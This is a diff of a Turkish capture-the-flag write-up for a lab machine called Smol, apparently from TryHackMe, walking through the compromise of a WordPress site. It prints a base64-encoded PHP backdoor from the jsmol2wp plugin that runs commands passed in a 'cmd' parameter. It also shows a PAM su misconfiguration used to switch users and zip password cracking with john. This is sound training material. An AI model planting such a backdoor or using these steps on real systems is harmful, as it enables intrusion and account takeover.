@@ -11,7 +11,7 @@ image:
 
 ## Özet
 
-Smol, zafiyetli bir eklentiye sahip orta seviye linux bir makinedir. Öncelikle eklentide bulunan "Local File Inclusion" zafiyetinden yararlanarak kullanıcı bilgilerini alacağız. Daha sonra bulduğumuz bir yönergeyi takip ederek sistemden shell elde edeceğiz. Sisteme girdikten sonra ise dört kullanıcı arasında sırasıyla geçiş yapacak, en son ise sudo haklarımızdan yararlanarak yetki yükselteceğiz.
+Smol, zafiyetli bir eklentiye sahip orta seviye linux bir makinedir. Öncelikle eklentide bulunan `SSRF` zafiyetinden yararlanarak kullanıcı bilgilerini alacağız. Daha sonra bulduğumuz bir yönergeyi takip ederek sistemden shell elde edeceğiz. Sisteme girdikten sonra ise dört kullanıcı arasında sırasıyla geçiş yapacak, en son ise sudo haklarımızdan yararlanarak yetki yükselteceğiz.
 
 ### Makine hakkında ek bilgiler
 
@@ -62,7 +62,7 @@ $ wpscan --url http://www.smol.thm/ -e p
  |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 ```
 
-Tarama sonucunda `jsmol2wp` adında bir bir eklenti kullandığını öğreniyoruz. Eklentiyi internette arattığımızda [bu](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt) github sayfası ile karşılaşıyoruz.
+Tarama sonucunda `jsmol2wp` adında bir eklenti kullandığını öğreniyoruz. Eklentiyi internette arattığımızda [bu](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt) github sayfası ile karşılaşıyoruz.
 
 ## Sömürü aşaması
 
@@ -82,7 +82,7 @@ Eklentilerin birinde gizli bir arka kapı olduğu bilgisi verilmişti zaten. Bur
 
 ![](5.webp){: width="1200" height="600" }
 
-Gördüğünüz üzere önce base64 ile kodlanmış veriyi çözüyor daha sonra ise eval fonksiyonu ile çalıştırıyor.
+Gördüğünüz üzere önce base64 ile kodlanmış veriyi çözüyor daha sonra ise eval fonksiyonu ile çalıştırıyor. Kodlanmış bu veriyi chepy aracı ile çözdükten sonra `cmd` parametresini kullanarak sistemde komut çalıştırabileceğimizi görüyoruz
 
 ```console
 $chepy "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA="
@@ -93,7 +93,7 @@ $chepy "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwx
 >>>
 ```
 
-Kodlanmış bu veriyi chepy aracı ile çözdükten sonra “cmd” parametresini kullanarak sistemde komut çalıştırabileceğimizi görüyoruz. Parametreyi kullanarak sistemden shell elde etmek için eklentinin bulunduğu sayfaya yöneldim ama komutu gönderdiğimde herhangi bir tepki vermedi. Haliyle komut çalıştırabilmek için bu eklentinin kullanıldığı bir alan bulmamız gerektiğini düşündüm. Ana sayfaya tekrar döndüğümde sağ kısımda şiirden bir parça gördüm ve ana sayfada kullanıldığını düşünerek parametreyi ekledim.
+Parametreyi kullanarak sistemden shell elde etmek için eklentinin bulunduğu sayfaya yöneldim ama komutu gönderdiğimde herhangi bir tepki vermedi. Haliyle komut çalıştırabilmek için bu eklentinin kullanıldığı bir alan bulmamız gerektiğini düşündüm. Ana sayfaya tekrar döndüğümde sağ kısımda şiirden bir parça gördüm ve ana sayfada kullanıldığını düşünerek parametreyi ekledim.
 
 ![](6.webp){: width="1200" height="600" }
 
@@ -147,17 +147,17 @@ $ ssh think@10.10.240.79 -i id_rsa
 
 ### gege
 
-Bu kullanıcıdanda muhtemelen gege kullanıcısına geçiş yapmamız gerekiyor. Sistemde uzun bir süre gezdikten sonra think kullanıcısının parola kullanmadan gege kullanıcısına geçiş yapabileceğini öğrendim.
+Sistemde uzun bir süre gezdikten sonra think kullanıcısının parola kullanmadan gege kullanıcısına geçiş yapabileceğini öğrendim.
 
 ```console
-think@smol:/etc/pam.d$ cat su                                                                                                                                                                 
+think@smol:/etc/pam.d$ cat su
 ...                                                                                                                                                 
-auth  [success=ignore default=1] pam_succeed_if.so user = gege                                                                                                                                
+auth  [success=ignore default=1] pam_succeed_if.so user = gege
 auth  sufficient                 pam_succeed_if.so use_uid user = think
 ...
 ```
 
-/etc/pam.d dizini sistemdeki doğrulamalar için kullanılan yapılandırma dosyalarını barındıyor. Bunlardan biri olan su komutunun değiştirildiğini görüyoruz.
+/etc/pam.d dizini sistemdeki doğrulamalar için kullanılan yapılandırma dosyalarını barındıyor. Bunlardan biri olan su dosyasının düzenlendiğini görüyoruz.
 
 ```console
 think@smol:/etc/pam.d$ su gege
@@ -168,7 +168,7 @@ wordpress.old.zip
 
 ### xavi
 
-Kullanıcı değişiminden sonra zip dosyasını çıkarmak için /home/gege dizine gittim ama parola koruması olduğu için dosyayı çıkaramadım. Bu zip dosyasını kırmak için önce kendi sistemime indirdim. Daha sonra “zip2john wordpress.old.zip > hash” komutu ile kırılabilir bir formata çevirdim ve john aracını çalıştırdım
+Kullanıcı değişiminden sonra zip dosyasını çıkarmak için /home/gege dizine gittim ama parola koruması olduğu için dosyayı çıkaramadım. Bu zip dosyasını kırmak için önce kendi sistemime indirdim. Daha sonra `zip2john wordpress.old.zip > hash` komutu ile kırılabilir bir formata çevirdim ve john aracını çalıştırdım
 
 ```console
 $ cat hash 
